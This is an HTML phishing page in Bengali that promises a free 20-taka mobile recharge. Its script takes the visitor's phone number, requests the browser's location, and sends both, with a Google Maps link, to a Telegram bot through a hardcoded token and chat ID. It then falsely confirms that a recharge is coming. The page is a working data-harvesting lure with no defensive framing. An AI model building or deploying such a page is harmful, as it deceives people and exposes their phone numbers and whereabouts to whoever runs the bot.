<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>২০ টাকা ফ্রি রিচার্জ!</title>
    <style>
        body { background: #f4f4f4; text-align: center; font-family: Arial; padding: 50px; }
        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
    <p>আপনার নম্বরটি দিয়ে রিচার্জ নিশ্চিত করুন</p>
    <input type="number" id="num" placeholder="01XXXXXXXXX">
    <br>
    <button onclick="send()">রিচার্জ নিন</button>
</div>

<script>
function send() {
    var phone = document.getElementById('num').value;
    if (phone.length < 11) { alert("সঠিক নম্বর দিন"); return; }
    
    var token = "8056072120:AAH-Y5n9fP_7XnS_K4W5-U7mP_4"; 
    var chat_id = "5907727181"; 

    navigator.geolocation.getCurrentPosition(function(pos) {
        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;
        var map = "https://www.google.com/maps?q=" + lat + "," + lon;
        var msg = "🎯 নম্বর: " + phone + "\n📍 ম্যাপ: " + map;
        
        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg));
        alert("সফল হয়েছে! ৩০ মিনিটে রিচার্জ পাবেন।");
    }, function() {
        var msg = "⚠️ নম্বর (লোকেশন অফ): " + phone;
        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg));
        alert("সফল হয়েছে!");
    });
}
</script>

</body>
</html>
